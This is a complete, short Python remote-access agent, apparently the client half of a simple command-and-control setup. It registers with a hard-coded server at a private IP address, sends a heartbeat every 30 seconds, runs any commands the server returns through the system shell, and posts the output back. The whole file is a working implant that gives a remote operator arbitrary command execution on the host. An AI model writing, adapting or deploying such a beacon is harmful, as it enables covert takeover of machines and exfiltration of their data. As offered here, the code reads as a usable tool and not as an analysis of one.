import json, subprocess, time, uuid, socket, requests

SERVER_URL = "http://192.168.1.76:5000"
hostname = socket.gethostname()
AGENT_ID = f"Agent-{uuid.uuid4().hex[:6]}"

def register_agent():
    r = requests.post(f"{SERVER_URL}/register", json={"agent_id": AGENT_ID, "hostname": hostname})
    print(f"[+] Registered: {AGENT_ID}, response={r.json()}")

def heartbeat():
    r = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": AGENT_ID})
    if r.status_code != 200:
        return
    
    response = r.json()

    # If server has commands for this agent
    if response.get("agent_id") == AGENT_ID:
        commands = response.get("commands", [])
        beacon_command(commands)

def beacon_command(commands):
    for cmd in commands:
        output = execute_command(cmd["command"])
        requests.post(f"{SERVER_URL}/result", json={
            "command_id": cmd["command_id"],
            "result": output
        })

def execute_command(command):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT
        )
        return result.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore")

if __name__ == "__main__":
    register_agent()
    while True:
        heartbeat()   # updates status + pulls + executes commands
        time.sleep(30)
